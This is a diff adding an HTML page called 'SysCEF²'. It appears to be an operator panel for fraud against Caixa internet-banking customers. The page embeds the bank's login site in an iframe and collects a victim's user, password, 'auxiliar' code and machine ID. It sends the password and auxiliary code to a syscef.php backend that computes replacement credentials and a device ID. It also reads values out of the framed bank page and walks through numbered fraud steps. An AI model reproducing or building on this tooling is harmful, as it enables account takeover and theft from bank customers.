@@ -1,0 +1,222 @@
+<html xmlns="http://www.w3.org/1999/xhtml">
+ <head>
+  <title>
+   SysCEF² | a segunda vez eh mais gostoso
+  </title>
+  <link type="image/x-icon" href="http://200.201.166.200/favicon.ico" rel="icon" />
+  <style type="text/css">
+   body, html {
+				margin		: 0;
+				padding 	: 0;
+				color		: white;
+			}
+			#login form{
+				font-size	:11px;
+				font-family	: Arial;
+				margin		:0;
+				padding		:0;
+			}
+			
+			#principal {
+				width	: 100%;
+				height	: 100%;
+			}
+			
+			body{
+				background-color: #222222;
+				font-family		: sans-serif, Arial;
+			}
+			
+			#login fieldset{
+				padding: 20px;
+				border: 1px solid #ccc;
+				width: 70%;
+			}
+			
+			#login legend{
+				font-weight: bold;
+				color: #FF7F00;
+				font-size: 11pt;
+				letter-spacing: 1px;
+			}
+			
+			html&gt;body #login legend{
+				margin-bottom: 0px;
+			}
+			
+			#login input[type=text] {
+				border-radius	: 3px;
+				margin-left		: 5px;
+			}
+			
+			#login input, #login button{
+				border-top		: 1px solid #333;
+				border-left		: 1px solid #333;
+				border-bottom	: 1px solid #ccc;
+				border-right	: 1px solid #ccc;
+				font-size		: 13px;
+				margin-bottom	: 10px;
+				color			: #0E0659;
+			}
+			
+			#login button, #login input[type=reset], #login input[type=submit] {
+				border-radius	: 3px;
+				padding			: 5px 10px;
+				cursor			: pointer;
+			}
+			
+			#login button:hover, #login input[type=reset]:hover, #login input[type=submit]:hover {
+				background-color : #DDF;
+			}
+			
+			#login label{
+				display: block;
+				width: 140px;
+				float: left;
+				color: white;
+				border-bottom: 1px dotted silver;
+			}
+			
+			#login span{
+				color		: #999;
+				font-size	: 12px;
+			}
+			
+			#login .botao{
+				font-size		: 13px;
+				background		: #f1f1f1;
+				margin: 15px 0px 0px 0px;
+			}
+			
+			#box, input[type="radio] {
+				color 	: white; !important
+			}
+  </style>
+  <script src="jquery-2.1.0.min.js">
+  </script>
+  <script>
+   function autom() {
+				var a, b, c;
+				
+				a = document.getElementById("aux1").value;
+				b = document.getElementById("senha").value;
+				
+				$.get("syscef.php?new=1&amp;aux=" + a + "&amp;sen=" + b,function(data,status){
+					c = data.split("|");
+					document.getElementById("senha").value		= c[1];
+					document.getElementById("idMaquina").value	= c[0];
+					console.log(c);
+				});
+			}
+		
+			function encode(field_id) {
+				var obj = document.getElementById(field_id);
+				var unencoded = obj.value;
+				obj.value = encodeURIComponent(unencoded).replace(/'/g,"%27").replace(/"/g,"%22");	
+			}
+			
+
+			function decode(field_id) {
+				var obj = document.getElementById(field_id);
+				var encoded = obj.value;
+				obj.value = decodeURIComponent(encoded.replace(/\+/g,  " "));
+			}
+
+
+			function encodeFields() {
+				var a, b, c;
+				a = 'aux1';
+				b = 'senha';
+				c = 'idMaquina';
+				
+				encode(a); encode(b); encode(c);
+			}
+			
+			function decodeFields() {
+				var a, b, c;
+				a = 'aux1';
+				b = 'senha';
+				c = 'idMaquina';
+				
+				decode(a); decode(b); decode(c);
+			}
+			
+			function getAux() {
+				try {
+					document.getElementById("aux1").value = document.getElementById("principal").contentWindow.document.getElementsByName("aux1")[0].value;
+				} catch(e) {
+					alert('Nao foi possivel obter o auxiliar.');
+				}
+			}
+  </script>
+ </head>
+ <body>
+  <br />
+  <div id="login">
+   <form method="post" document.getelementbyid="document.getelementbyid">
+    <fieldset>
+     <legend>
+      <b>
+       SysCEF²
+      </b>
+     </legend>
+     <label for="login">
+      USUARIO
+     </label>
+     <input type="text" size="20" autocomplete="off" onkeyup="this.value=this.value.toUpperCase()" value="" id="usuario" name="usuario" />
+     <br />
+     <label for="apelido">
+      APELIDO
+     </label>
+     <input type="text" size="20" autocomplete="on" value="" id="apelido" name="apelido" />
+     <br />
+     <label for="aux1">
+      AUXILIAR
+     </label>
+     <input type="text" size="20" autocomplete="on" value="" id="aux1" name="aux1" />
+     <br />
+     <label for="senha">
+      SENHA
+     </label>
+     <input type="text" size="20" autocomplete="off" value="" id="senha" name="senha" />
+     <a style="color: #88DDDD;" href="javascript: autom();">
+      Calcula
+     </a>
+     <br />
+     <label for="idMaquina">
+      F10
+     </label>
+     <input type="text" size="20" autocomplete="on" value="" id="idMaquina" name="idMaquina" />
+     <br />
+     <!-- onclick="document.getElementById('logincef').submit();"  -->
+     <input type="radio" value="tipo" name="tipo" />
+     Juri
+     <input type="radio" checked="true" value="1" onclick="a();" id="box" name="box" />
+     Passo 1
+     <input type="radio" value="2" onclick="b();" id="box" name="box" />
+     Passo 2
+     <input type="radio" value="3" onclick="c();" id="box" name="box" />
+     Passo 3
+     <input type="radio" value="4" onclick="a();" id="box" name="box" />
+     Passo 4
+     <input type="radio" value="5" onclick="a();" id="box" name="box" />
+     Passo 5
+     <input type="submit" value="Enviar" />
+     <input type="reset" value="Limpar" />
+     <button type="button" onclick="javascript: encodeFields();">
+      Encode
+     </button>
+     <button type="button" onclick="javascript: decodeFields();">
+      Decode
+     </button>
+     <button type="button" onclick="javascript: getAux();">
+      Auxiliar
+     </button>
+    </fieldset>
+   </form>
+  </div>
+  <br />
+  <iframe width="100%" frameborder="0" id="principal" name="principal" src="https://internetbanking.caixa.gov.br">
+  </iframe>
+ </body>
+</html>
